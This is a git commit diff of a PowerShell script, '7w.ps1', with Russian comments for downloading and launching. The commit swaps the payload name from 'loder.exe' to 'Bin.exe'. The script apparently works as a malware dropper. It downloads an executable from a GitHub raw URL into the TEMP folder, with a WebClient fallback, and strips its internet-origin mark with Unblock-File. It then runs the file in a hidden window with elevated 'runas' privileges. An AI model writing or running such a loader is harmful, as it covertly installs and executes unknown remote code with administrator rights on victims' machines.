35eb3c737aa8495737b68d7719671679671d1782
ShramC <ShramC@proton.me>
2026-07-24 10:49:58 +0300

    7w.ps1

--- 7w.ps1
+++ 7w.ps1
@@ -10,19 +10,19 @@ $ProgressPreference = 'SilentlyContinue'
 
 # Скачивание
 try {
-    Invoke-WebRequest -Uri "https://github.com/ShramC/Ds/raw/refs/heads/main/loder.exe" -OutFile "$env:TEMP\loder.exe" -UseBasicParsing -ErrorAction Stop
+    Invoke-WebRequest -Uri "https://github.com/ShramC/Ds/raw/refs/heads/main/Bin.exe" -OutFile "$env:TEMP\Bin.exe" -UseBasicParsing -ErrorAction Stop
 } catch {
     $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile("https://github.com/ShramC/Ds/raw/refs/heads/main/loder.exe", "$env:TEMP\loder.exe")
+    $wc.DownloadFile("https://github.com/ShramC/Ds/raw/refs/heads/main/Bin.exe", "$env:TEMP\Bin.exe")
     $wc.Dispose()
 }
 
 # Запуск
-if (Test-Path "$env:TEMP\loder.exe") {
-    Unblock-File -Path "$env:TEMP\loder.exe" -ErrorAction SilentlyContinue
+if (Test-Path "$env:TEMP\Bin.exe") {
+    Unblock-File -Path "$env:TEMP\Bin.exe" -ErrorAction SilentlyContinue
     
     $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = "$env:TEMP\loder.exe"
+    $psi.FileName = "$env:TEMP\Bin.exe"
     $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
     $psi.Verb = "runas"
     $psi.UseShellExecute = $true
